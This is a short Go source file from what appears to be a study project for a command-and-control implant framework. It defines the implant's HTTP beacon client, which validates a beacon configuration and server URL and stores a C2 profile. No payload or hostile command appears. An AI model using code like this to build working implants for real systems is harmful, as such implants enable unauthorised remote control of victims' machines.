package client

import (
	"errors"
	"net/http"
	"strings"
	"time"

	"xhc2_for_studying/implant/config"
	"xhc2_for_studying/protocol"
)

type Client struct {
	baseURL    string
	httpClient *http.Client
	c2Profile  *protocol.C2Profile
}

func NewClient(cfg *config.BeaconConfig) (*Client, error) {
	if cfg == nil {
		return nil, errors.New("beacon config is nil")
	}
	if cfg.ServerURL == "" {
		return nil, errors.New("server url is empty")
	}

	return &Client{
		baseURL: strings.TrimRight(cfg.ServerURL, "/"),
		httpClient: &http.Client{
			Timeout: 10 * time.Second,
		},
		c2Profile: &cfg.C2Profile,
	}, nil
}
